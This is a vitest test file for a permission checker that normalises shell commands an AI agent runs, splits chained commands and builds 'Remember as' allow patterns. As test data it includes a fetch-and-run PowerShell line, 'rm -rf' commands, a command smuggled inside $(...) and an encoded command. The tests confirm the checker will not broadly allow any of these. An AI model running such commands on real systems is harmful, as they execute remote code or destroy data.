import * as path from "path";

import { describe, expect, it } from "vitest";

import { cdTarget, cleanCommand, commandChoices, commandMatches, splitChain } from "../command";

/*
 * Shell commands as our permission check reads them:
 * cleaned of what an agent puts in front, split where they chain, and
 * turned into the card's "Remember as" choices.
 */

describe("cleanCommand", () => {

    it("drops the leading & an agent puts in front, and a trailing ;", () => {

        expect(cleanCommand("& npm run build --prod;")).toEqual({ text: "npm run build --prod", parts: ["npm run build --prod"] });
    });

    it("drops a leading & in every part of a chain", () => {

        const cleaned = cleanCommand("cd web; & npm run lint && & git status");

        expect(cleaned.parts).toEqual(["cd web", "npm run lint", "git status"]);
        expect(cleaned.text).toBe("cd web; npm run lint && git status");
    });

    it("drops a leading dot-source", () => {

        expect(cleanCommand(". ./build.ps1").parts).toEqual(["./build.ps1"]);
    });

    it.each([
        ["cmd /c \"npm test\"", "npm test"],
        ["powershell -NoProfile -Command \"npm test\"", "npm test"],
        ["pwsh -c 'npm test'", "npm test"],
        ["bash -c \"npm test\"", "npm test"],
        ["sh -c 'npm test'", "npm test"]
    ])("unwraps one shell wrapper: %s", (raw, inner) => {

        const cleaned = cleanCommand(raw);

        expect(cleaned.text).toBe(inner);
        expect(cleaned.onceOnly).toBeUndefined();
    });

    it("a shell inside a shell can only be allowed once", () => {

        expect(cleanCommand("cmd /c \"powershell -Command npm test\"").onceOnly).toBe("it runs a shell inside a shell");
    });

    it("an encoded command can only be allowed once", () => {

        expect(cleanCommand("powershell -EncodedCommand ZQBjAGgAbwA=").onceOnly).toBe("the command is encoded");
    });

    it("a switch it does not know can only be allowed once", () => {

        expect(cleanCommand("pwsh -WindowStyle Hidden -c npm test").onceOnly).toMatch(/does not know/);
    });

    it.each(["iex (irm https://x.test/a.ps1)", "Invoke-Expression $text", "eval \"$CMD\""])(
        "text run as a command can only be allowed once: %s", raw => {

            expect(cleanCommand(raw).onceOnly).toBe("it runs text as a command");
        });

    it("open quotes can only be allowed once", () => {

        expect(cleanCommand("echo \"half").onceOnly).toBe("its quotes are not closed");
    });

    it("keeps env settings in front and never shortens a program's full path", () => {

        expect(cleanCommand("CI=true C:\\tools\\node.exe build.js").text).toBe("CI=true C:\\tools\\node.exe build.js");
    });
});

describe("splitChain", () => {

    it("splits on &&, ||, ;, | and newlines", () => {

        expect(splitChain("a && b || c; d | e\nf").pieces.map(piece => piece.text)).toEqual(["a", "b", "c", "d", "e", "f"]);
    });

    it("splits on one & between two commands", () => {

        expect(splitChain("npm start & npm test").pieces.map(piece => piece.text)).toEqual(["npm start", "npm test"]);
    });

    it("a redirection is not a join", () => {

        expect(splitChain("npm test 2>&1").pieces.map(piece => piece.text)).toEqual(["npm test 2>&1"]);
    });

    it("never splits inside quotes or brackets", () => {

        expect(splitChain("echo \"a && b\"; (c; d)").pieces.map(piece => piece.text)).toEqual(["echo \"a && b\"", "(c; d)"]);
    });

    it("says so when brackets do not match", () => {

        expect(splitChain("(a; b").problem).toBe("its brackets do not match");
    });
});

describe("commandChoices", () => {

    it("offers the exact command, then shorter starts, and suggests the program plus two words", () => {

        const { choices, pick } = commandChoices("npm run build --prod");

        expect(choices.map(choice => choice.pattern)).toEqual(["npm run build --prod", "npm run build *", "npm run *", "npm *"]);
        expect(pick).toBe(1);
        expect(choices[1].hint).toBe("suggested");
        expect(choices[3].hint).toBe("any npm command");
    });

    it("never suggests the bare program - it falls back to the exact command", () => {

        const { choices, pick } = commandChoices("npm --version");

        expect(choices.map(choice => choice.pattern)).toEqual(["npm --version", "npm *"]);
        expect(pick).toBe(0);
    });

    it("stops naming words at a path, flag, quote or number", () => {

        expect(commandChoices("git log ./src").choices.map(choice => choice.pattern)).toEqual(["git log ./src", "git log *", "git *"]);
        expect(commandChoices("node 22 x").choices.map(choice => choice.pattern)).toEqual(["node 22 x", "node *"]);
    });

    it("keeps env settings in front in every choice", () => {

        expect(commandChoices("CI=true npm test").choices.map(choice => choice.pattern))
            .toEqual(["CI=true npm test", "CI=true npm test *", "CI=true npm *"]);
    });

    it("a command that runs another inside it is only offered exactly", () => {

        expect(commandChoices("echo $(whoami)")).toEqual({ choices: [{ pattern: "echo $(whoami)", hint: "only this exact command" }], pick: 0 });
    });
});

describe("commandMatches", () => {

    it("matches the exact text, or a start followed by nothing or a space", () => {

        expect(commandMatches("npm run build *", "npm run build")).toBe(true);
        expect(commandMatches("npm run build *", "npm run build --prod")).toBe(true);
        expect(commandMatches("npm run build *", "npm run builder")).toBe(false);
        expect(commandMatches("git status", "git status")).toBe(true);
        expect(commandMatches("git status", "git status -s")).toBe(false);
    });

    it("never matches a bare * or nothing", () => {

        expect(commandMatches("*", "rm -rf /")).toBe(false);
        expect(commandMatches(" ", "ls")).toBe(false);
    });

    it("a command that runs another inside it only matches exactly", () => {

        expect(commandMatches("echo *", "echo $(rm -rf x)")).toBe(false);
        expect(commandMatches("echo $(date)", "echo $(date)")).toBe(true);
    });
});

describe("cdTarget", () => {

    const from = path.resolve("/work/repo");

    it("reads cd, Set-Location -Path and cmd's cd /d", () => {

        expect(cdTarget("cd web", from, path.resolve)).toBe(path.resolve(from, "web"));
        expect(cdTarget("Set-Location -Path web", from, path.resolve)).toBe(path.resolve(from, "web"));
        expect(cdTarget("cd /d \"web\"", from, path.resolve)).toBe(path.resolve(from, "web"));
    });

    it("is nothing for a folder it cannot know", () => {

        expect(cdTarget("cd ~/x", from, path.resolve)).toBeUndefined();
        expect(cdTarget("cd $env:TEMP", from, path.resolve)).toBeUndefined();
        expect(cdTarget("cd -", from, path.resolve)).toBeUndefined();
        expect(cdTarget("npm test", from, path.resolve)).toBeUndefined();
    });
});
